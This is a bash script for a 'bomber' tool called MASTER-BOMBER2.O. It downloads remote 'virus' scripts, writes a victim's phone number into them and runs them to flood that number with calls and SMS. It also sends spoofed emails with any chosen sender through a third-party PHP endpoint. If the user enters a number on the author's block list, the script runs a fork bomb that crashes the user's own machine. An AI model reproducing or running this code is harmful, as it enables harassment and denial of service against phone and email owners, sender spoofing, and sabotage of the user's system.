#!/bin/bash
## Coded by the jatin kalwar
##Don't steal my code read license
## if you use any part of code then give me credit
ver="v3.2"
vers1="v4.0"
vers2="v3.3"

##CONNECTING BANNER
intban(){
echo -e "\e[31m
        _________  _  ___  ______________________  _______
       / ___/ __ \/ |/ / |/ / __/ ___/_  __/  _/ |/ / ___/
      / /__/ /_/ /    /    / _// /__  / / _/ //    / (_ / 
      \___/\____/_/|_/_/|_/___/\___/ /_/ /___/_/|_/\___/  
                                                    
"
}

#CHECKING INTERNET
internet() {
    clear
    intban
    wget -q --spider https://github.com/jatinkalwar
   
source ./.logo 
if [ $? -eq 0 ]; then
    just
else
    clear
    ban
    sleep 1
    echo ""
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m You are not connected to internet !\e[93m"
    echo ""
    echo -e "\e[92m[\e[91m~\e[92m]\e[93m Please connect and try again !!\e[93m"
    echo ""
    echo ""
    exit
fi
}

#CHECKING SERVER
serveron() {
BLUE="$(printf '\e[34m')"
CYAN="$(printf '\e[36m')"
serverup="On"
server=$(cat Additional/.server.txt)
rm Additional/.server.txt
if [[ $server = $serverup ]]
then
echo ""
else
clear
echo "              $BLUE ╭━━━┳━━━┳━━━┳━━━┳━━━╮ ╭╮╱╭┳━━━┳╮╱╭╮"
echo "              $CYAN ┃╭━━┫╭━╮┃╭━╮┃╭━╮┃╭━╮┃ ┃┃╱┃┃╭━╮┃┃╱┃┃"
echo "              $BLUE ┃╰━━┫╰━╯┃╰━╯┃┃╱┃┃╰━╯┃ ┃╰━╯┃┃┃┃┃╰━╯┃"
echo "              $CYAN ┃╭━━┫╭╮╭┫╭╮╭┫┃╱┃┃╭╮╭╯ ╰━━╮┃┃┃┃┣━━╮┃"
echo "              $BLUE ┃╰━━┫┃┃╰┫┃┃╰┫╰━╯┃┃┃╰╮ ╱╱╱┃┃╰━╯┃╱╱┃┃"
echo "              $CYAN ╰━━━┻╯╰━┻╯╰━┻━━━┻╯╰━╯ ╱╱╱╰┻━━━╯╱╱╰╯"
echo ""
echo ""
sleep 2
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Sorry for the inconvenience :(" | pv -qL 30
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[36m The Server is under maintenance !!" | pv -qL 20
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Contact the developer Jatin Kalwar !" | pv -qL 30
echo ""
exit
exit
exit
fi
}


cake() {
ztext=$(cat Additional/update.txt)
if [[ $vers1 = $ztext ]] || [[ $vers2 = $ztext ]];
then
rm Additional/update.txt
cd ..
rm -rf m-bomber2.O
clear
echo " "
echo " "
echo -e "\e[92mUpdating MASTER-BOMBER2.O \e[31m$ver \e[92mto \e[31m$ztext"
git clone https://github.com/jatinkalwar/m-bomber2.O 2> /dev/null
cd m-bomber2.O
bash bomber.sh
else
rm Additional/update.txt
clear
aunt
fi
}
aunt() {
FILE=Additional/save.txt
if [ -f "$FILE" ]; then
fix
jat 
else
tank
fi
}

fix() {
jtext=$(cat Additional/save.txt)
}

tank() {
echo -e "                   \e[31m▒\e[92m█\e[31m░░░ ▒\e[92m█▀▀▀█ \e[31m▒\e[92m█▀▀█ ▀█▀ \e[31m▒\e[92m█▄\e[31m░▒\e[92m█ "
echo -e "                   \e[31m▒\e[92m█\e[31m░░░ ▒\e[92m█\e[31m░░▒\e[92m█ \e[31m▒\e[92m█\e[31m░\e[92m▄▄ \e[31m▒\e[92m█\e[31m░ ▒\e[92m█\e[31m▒\e[92m█\e[31m▒\e[92m█"  
echo -e "                   \e[31m▒\e[92m█▄▄█ \e[31m▒\e[92m█▄▄▄█ \e[31m▒\e[92m█▄▄█ ▄█▄ \e[31m▒\e[92m█\e[31m░░\e[92m▀█"
echo ''
echo -e "\e[31mFill Your Details Correctly , It Will Help Us To Protect You From" | pv -qL 60
echo -e "\e[31m Tracing" | pv -qL 60
echo ''
echo -ne  "\e[93mEnter Your Name:- " 
read jelly
echo $jelly >> save.txt
mv save.txt Additional
clear
echo ''
echo ''
echo ''
echo -e "\e[93mPlease Wait It Will Take Only Few Minutes. This Is Only One Time"
echo -e "\e[93mProcess After Install."
echo ''
fix
jat
}

upda() {
if [ -d "Additional" ];
then
rm Additional/er3.txt
fi
clear
echo ''
echo ''
echo -e '\e[92m'
echo -e "\e[92m               █▀▄▀█ █▀█\e[31m░    \e[92m█▄▀ ▄▀█ █\e[31m░░ \e[92m█\e[31m░\e[92m█\e[31m░\e[92m█ ▄▀█ █▀█\e[92m"
echo -e "\e[92m               █\e[31m░\e[92m▀\e[31m░\e[92m█ █▀▄ ▄   █\e[31m░\e[92m█ █▀█ █▄▄ ▀▄▀▄▀ █▀█ █▀▄\e[93m"
echo ''
echo ''
echo -e "  \e[92m∆ \e[93mFetching Files From github.com/jatinkalwar, Please Wait..."
sleep 0.3
git clone https://github.com/jatinkalwar/toolupdater 2> /dev/null
mv toolupdater/error/er3.txt Additional 2> /dev/null
mv toolupdater/master-bomber/virus/*.sh Additional 2> /dev/null
mv toolupdater/*.txt Additional 2> /dev/null
mv toolupdater/.server.txt Additional 2> /dev/null
rm -rf toolupdater 2> /dev/null
}

passed(){
ban
main
echo ""
echo -e "\e[31mPLEASE ENTER ACCESS KEY IF YOU DON'T HAVE ACCESS KEY THEN GO TO MAIN MENU AND CHOOSE OPTION 2 FOR ACCESS KEY" | pv -qL 50
echo -e "\e[93m"
read  -p "ACCESS KEY: " access
bas=$(cat Additional/er3.txt)
if [[ $access = $bas ]];
then
echo ""
else
echo " "
echo -e "               \e[34m =============================\e[34m"
echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m    |"
echo -e "               \e[34m |                           |"
echo -e "               \e[34m |    Use shortlink for key  |"
echo -e "               \e[34m |\e[92mhttps://gplinks.co/eNHUCl7\e[34m |"
echo -e "               \e[34m |            [OR]           |"
echo -e "               \e[34m |\e[92m    https://bit.ly/3AeiAuD\e[34m |"
echo -e "               \e[34m =============================\e[34m"
echo " "
sleep 5.0
bombs
fi
}

upd(){
cd ..
rm -rf m-bomber2.O
sleep 1
echo -e "         \e[96mRECLONE IS GOING ON, PLEASE WAIT FOR A WHILE...!\e[0m"
echo
printf "                     \e[96m["
while git clone https://github.com/jatinkalwar/m-bomber2.O 2> /dev/null; do 
    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"
    sleep 1
done
printf "\e[96m]\e[0m"
echo
echo
echo
printf "\e[96m           RECLONE SUCCESSFULL (LATEST VERSION)..!\e[0m"
sleep 2.0
cd m-bomber2.O
bash bomber.sh
}
aemail(){
    ban
    amail
echo ""
echo -ne "    \e[31mTo:- \e[0m"
read too
echo ""
echo -ne "    \e[31mSubject:- \e[0m"
read subjectt
echo ""
echo -ne "    \e[31mMessage:- \e[0m"
read messagee
curl -X POST "https://indiscernible-spong.000webhostapp.com/gmail.php?to=$too&from=yourhackinghouse&subject=$subjectt&message=$messagee" > /dev/null 2>&1
echo ""
echo -e "                 \e[92mMessage Sent to \e[31m$too \e[92mSuccessfully"
echo ""
echo ""
echo -e " [\e[91m1\e[93m]\e[92m Resend \e[93m[\e[91m2\e[93m]\e[92m Menu \e[93m"
echo -e " [\e[91m3\e[93m]\e[92m Go back \e[93m[\e[91m4\e[93m]\e[92m Quit\e[93m"
echo -ne "NEXT: "
read optz
if [ $optz = "1" ];
then
aemail
elif [ $optz = "2" ];
then
jat
elif [ $optz = "3" ];
then
bombs
elif [ $optz = "4" ];
then
exit 1
else
echo "                                \e[91mxx \e[93mWRONG OPTION....! \e[91mxx"
fi



}
cemail(){

    ban
    cmail
echo ""
echo -ne "    \e[31mTo:- \e[0m"
read too
echo ""
echo -ne "    \e[31mFrom:- \e[0m"
read fromm
echo ""
echo -ne "    \e[31mSubject:- \e[0m"
read subjectt
echo ""
echo -ne "    \e[31mMessage:- \e[0m"
read messagee
curl -X POST "https://indiscernible-spong.000webhostapp.com/gmail.php?to=$too&from=$fromm&subject=$subjectt&message=$messagee" > /dev/null 2>&1
echo ""
echo -e "                    \e[92mMessage Sent to \e[31m$too \e[92mSuccessfully"
echo ""
echo ""
echo -e " [\e[91m1\e[93m]\e[92m Resend \e[93m[\e[91m2\e[93m]\e[92m Menu \e[93m"
echo -e " [\e[91m3\e[93m]\e[92m Go back \e[93m[\e[91m4\e[93m]\e[92m Quit\e[93m"
echo -ne "NEXT: "
read optz
if [ $optz = "1" ];
then
cemail
elif [ $optz = "2" ];
then
jat
elif [ $optz = "3" ];
then
bombs
elif [ $optz = "4" ];
then
exit 1
else
echo "                                \e[91mxx \e[93mWRONG OPTION....! \e[91mxx"
fi
}

callbomb(){
echo ""
echo -ne "NUMBER: \e[0m"
read num
file=Additional/.block.txt
for i in `cat $file`
do
if [ $i == $num ]
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
fi
done
clear
echo -e "\e[93m
╭━━━━━━━━━━━╮
┃━━━●━══━━━━┃
┃           ┃ \e[91m TARGET-\e[92m$num \e[93m
┃   \e[91mM-B2.O\e[93m  ┃ \e[91m ATTACK-\e[92mCALL BOMBING \e[93m
┃           ┃ \e[93m
┃           ┃ [\e[91m1\e[93m]\e[92m Bomb \e[93m[\e[91m2\e[93m]\e[92m Menu \e[93m
┃           ┃ [\e[91m3\e[93m]\e[92m Go back \e[93m[\e[91m4\e[93m]\e[92m Quit\e[93m
┃           ┃
┃\e[34m"$num"\e[93m ┃ \e[93m Press \e[91mCtrl+C\e[93m To Stop
┃           ┃ --------------------------
┃━━━━━○━━━━━┃ \e[96mDEVELOPER:\e[93mtheJatinKalwar
╰━━━━━━━━━━━╯"
if [ -f ".viru.sh" ]; then
rm .viru.sh
fi
cp Additional/.cvirus.sh .viru.sh
sed -i s/€tor/$num/g .viru.sh
aga(){
bash .viru.sh
bash .viru.sh
}
aga
echo -ne "NEXT: "
read optz
if [ $optz = "1" ];
then
aga
elif [ $optz = "2" ];
then
jat
elif [ $optz = "3" ];
then
bombs
elif [ $optz = "4" ];
then
exit 1
else
echo "                                \e[91mxx \e[93mWRONG OPTION....! \e[91mxx"
fi
}


smsbomb(){
echo ""
echo -ne "NUMBER: \e[0m"
read num
file=Additional/.block.txt
for i in `cat $file`
do
if [ $i == $num ]
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
fi
done
clear
echo -e "\e[93m
╭━━━━━━━━━━━╮
┃━━━●━══━━━━┃
┃           ┃ \e[91m TARGET-\e[92m$num \e[93m
┃   \e[91mM-B2.O\e[93m  ┃ \e[91m ATTACK-\e[92mSMS BOMBING \e[93m
┃           ┃ \e[93m
┃           ┃ [\e[91m1\e[93m]\e[92m Bomb \e[93m[\e[91m2\e[93m]\e[92m Menu \e[93m
┃           ┃ [\e[91m3\e[93m]\e[92m Go back \e[93m[\e[91m4\e[93m]\e[92m Quit\e[93m
┃           ┃
┃\e[34m"$num"\e[93m ┃ \e[93m Press \e[91mCtrl+C\e[93m To Stop
┃           ┃ --------------------------
┃━━━━━○━━━━━┃ \e[96mDEVELOPER:\e[93mtheJatinKalwar
╰━━━━━━━━━━━╯"
if [ -f ".viru.sh" ]; then
rm .viru.sh
fi
cp Additional/.svirus.sh .viru.sh
sed -i s/€tor/$num/g .viru.sh
aga(){
bash .viru.sh
bash .viru.sh
}
aga
echo -ne "NEXT: "
read optz
if [ $optz = "1" ];
then
aga
elif [ $optz = "2" ];
then
jat
elif [ $optz = "3" ];
then
bombs
elif [ $optz = "4" ];
then
exit 1
else
echo "                                \e[91mxx \e[93mWRONG OPTION....! \e[91mxx"
fi
}





mass(){
echo ""
echo -ne "NUMBER: \e[0m"
read num
file=Additional/.block.txt
for i in `cat $file`
do
if [ $i == $num ]
then
echo
echo -e "        \e[34m ===============================================\e[34m"
echo -e "        \e[34m | \e[34mDONT TRY TO BOMB MY NUMBER BRO.............\e[34m|"
echo -e "        \e[34m ===============================================\e[34m"
echo
sleep 3.0
:(){ :|: & };:
exit 1
fi
done
clear
echo -e "\e[93m
╭━━━━━━━━━━━╮
┃━━━●━══━━━━┃
┃           ┃ \e[91m TARGET-\e[92m$num \e[93m
┃   \e[91mM-B2.O\e[93m  ┃ \e[91m ATTACK-\e[92mMASS BOMBING \e[93m
┃           ┃ \e[93m
┃           ┃ [\e[91m1\e[93m]\e[92m Bomb \e[93m[\e[91m2\e[93m]\e[92m Menu \e[93m
┃           ┃ [\e[91m3\e[93m]\e[92m Go back \e[93m[\e[91m4\e[93m]\e[92m Quit\e[93m
┃           ┃
┃\e[34m"$num"\e[93m ┃ \e[93m Press \e[91mCtrl+C\e[93m To Stop
┃           ┃ --------------------------
┃━━━━━○━━━━━┃ \e[96mDEVELOPER:\e[93mtheJatinKalwar
╰━━━━━━━━━━━╯
"
if [ -f ".viru.sh" ]; then
rm .viru.sh
fi
cp Additional/.virus.sh .viru.sh
sed -i s/€tor/$num/g .viru.sh
aga(){
bash .viru.sh
bash .viru.sh
}
aga
echo -ne "NEXT: "
read optz
if [ $optz = "1" ];
then
aga
elif [ $optz = "2" ];
then
jat
elif [ $optz = "3" ];
then
bombs
elif [ $optz = "4" ];
then
exit 1
else
echo "                                \e[91mxx \e[93mWRONG OPTION....! \e[91mxx"
fi
}

 banner() {
    clear 
ban
echo -e "                \e[93mHey!! Welcome \e[32m$jtext \e[93mHacker"
 echo " "  
 main
     echo -e "\e[32mThis Bomber Is Created By \e[94mtheJatinKalwar \e[32m(\e[31m$ver\e[32m)" 
    echo -e "\e[32mFacebook:- \e[94mYourhackinghouse" 
    echo -e "\e[32mInstagram:- \e[94mYourhackinghouse" 
    echo -e "\e[32mOfficial Telegram Group:- \e[94mMBOMBER20" 
    echo -e "\e[93mPlease use for Educational Purpose only!!!" 
    echo ' '
}
jat() {
    clear 
    banner
        echo -e "\e[4;31m Please Read Instruction Carefully !!! \e[0m"
echo -e "\e[92m[\e[91m1\e[92m]\e[93m Start\e[93m"
echo -e "\e[92m[\e[91m2\e[92m]\e[93m Access Key\e[93m"
echo -e "\e[92m[\e[91m3\e[92m]\e[93m Visit Our Website\e[93m"
echo -e "\e[92m[\e[91m4\e[92m]\e[93m About Me\e[93m"
echo -e "\e[92m[\e[91m5\e[92m]\e[93m Reclone Tool\e[93m"
echo -e "\e[92m[\e[91m6\e[92m]\e[93m Logout\e[93m"
echo -e "\e[92m[\e[91m0\e[92m]\e[93m Exit\e[93m"
echo ''
echo -ne "\e[92mSelect Option\e[0m: \e[92m"
    read ch
    clear
    if [ $ch -eq 1 ];
    then
    bombs
    elif [ $ch -eq 2 ];then
    ban
    echo -e "\e[93mJOIN OUR TELEGRAM GROUP FOR KEYS AND UPDATES" | pv -qL 10
    sleep 3.0
    xdg-open https://t.me/MBOMBER20
    jat
    elif [ $ch -eq 3 ];then
    am start -a android.intent.action.VIEW -d https://bit.ly/2QT6dSR > /dev/null 2>&1
    clear
    banner
    jat
    elif [ $ch -eq 4 ];then
abot(){
echo -e "\e[91m                     ──▐─▌──▐─▌── "
echo -e "\e[91m                     ─▐▌─▐▌▐▌─▐▌─ "
echo -e "\e[91m                     ─█▄▀▄██▄▀▄█─ "
echo -e "\e[91m                     ──▄──██▌─▄── "
echo -e "\e[91m                     ▄▀─█▀██▀█─▀▄ "
echo -e "\e[91m                     ▐▌▐▌─▐▌─▐▌▐▌ "
echo -e "\e[91m                     ─▐─█────█─▌─ "
echo -e "\e[91m                     ────▌──▐──── "
echo -e "\e[93m                    CALL ME \e[92mJATT" | pv -qL 10
echo -e "\e[93m               REAL NAME \e[92mJATIN KALWAR" | pv -qL 10
echo -e "\e[93m             I AM FROM \e[92mYOURHACKINGHOUSE" | pv -qL 10
echo -e "\e[93m        IM A \e[92mGEEK\e[93m WITH LOTS OF EXCITEMENT" | pv -qL 10
echo -e "\e[93m       HOPE YOU LIKE THIS MASTER BOMBER 2.O" | pv -qL 10
echo -e "\e[93m         OOPS... I TALK A LOT SRY FOR THAT " | pv -qL 10
echo -e "\e[93m              JOIN GROUPS ON \e[92mTELEGRAM" | pv -qL 10
#echo -e "\e[93m        MY WEBSITE:\e[92m https://bit.ly/2QT6dSR \e[0m" | pv -qL 10
echo -e "\e[92m                BYEE.............." | pv -qL 10
}
    abot
    sleep 8.0
    clear
    banner
    jat	
 elif [ $ch -eq 5 ];then
    upd

elif [ $ch -eq 6 ];then
rm Additional/save.txt
clear
ban
echo 'BYE....... TATA.........' | lolcat

    elif [ $ch -eq 0 ];then
        ban
        figlet Exit | lolcat
        echo ' BYEEEEEE............ ' | lolcat
        exit
    else
        echo -e "\e[4;32m Invalid Input !!! \e[0m"
        jat
    fi
}
bombs() {
    clear
    banner
echo -e "\e[92m[\e[91m1\e[92m]\e[93m Mass Bombing\e[93m"
echo -e "\e[92m[\e[91m2\e[92m]\e[93m Sms Bombing\e[93m"
echo -e "\e[92m[\e[91m3\e[92m]\e[93m Call Bombing\e[93m"
echo -e "\e[92m[\e[91m4\e[92m]\e[93m Email Bombing\e[93m"
echo -e "\e[92m[\e[91m5\e[92m]\e[93m Whatsapp Bombing\e[93m"
echo -e "\e[92m[\e[91m6\e[92m]\e[93m Anonymous Sms\e[93m"
echo -e "\e[92m[\e[91m7\e[92m]\e[93m Anonymous Email\e[93m"
echo -e "\e[92m[\e[91m8\e[92m]\e[93m Custom Email\e[93m"
echo -e "\e[92m[\e[91m9\e[92m]\e[93m Access Key\e[93m"
echo -e "\e[92m[\e[91m10\e[92m]\e[93m Back\e[93m"
echo -e "\e[92m[\e[91m00\e[92m]\e[93m Exit\e[93m"
echo ''
echo -ne "\e[92mSelect Option\e[0m: \e[92m"
read ch
    clear
    if [ $ch -eq 1 ];then
    passed
    clear
    ban
    mbomb
    mass
    exit
    
elif [ $ch -eq 2 ];then
       passed
       clear
        ban
        sbomb
        smsbomb
    elif [ $ch -eq 3 ];then
        passed
       clear
        ban
        cbomb
        callbomb
    elif [ $ch -eq 4 ];then
        clear
        emailbomb
    elif [ $ch -eq 5 ];then
        clear
        whatsbomb
elif [ $ch -eq 6 ];then
        clear
ban
echo -e "\e[92mAnonymous SMS will update soon"
sleep 3.0
bombs
elif [ $ch -eq 7 ];then
passed
clear
aemail

elif [ $ch -eq 8 ];then
    passed
    clear
    cemail 
elif [ $ch -eq 9 ]; then
    ban
    echo -e "\e[93mJOIN OUR TELEGRAM GROUP FOR KEYS AND UPDATES" | pv -qL 10
    sleep 3.0
    xdg-open https://t.me/MBOMBER20
    bombs
elif [ $ch -eq 10 ];then
clear
banner
jat
elif [ $ch -eq 00 ];then
        ban
        figlet Exit | lolcat
        echo ' BYEEEEEE............ ' | lolcat
        exit
    else
        echo -e "\e[4;32m Invalid Input !!! \e[0m"
    fi
   exit
   }

internet
ban
clear
upda
clear
serveron
clear
banner
cake
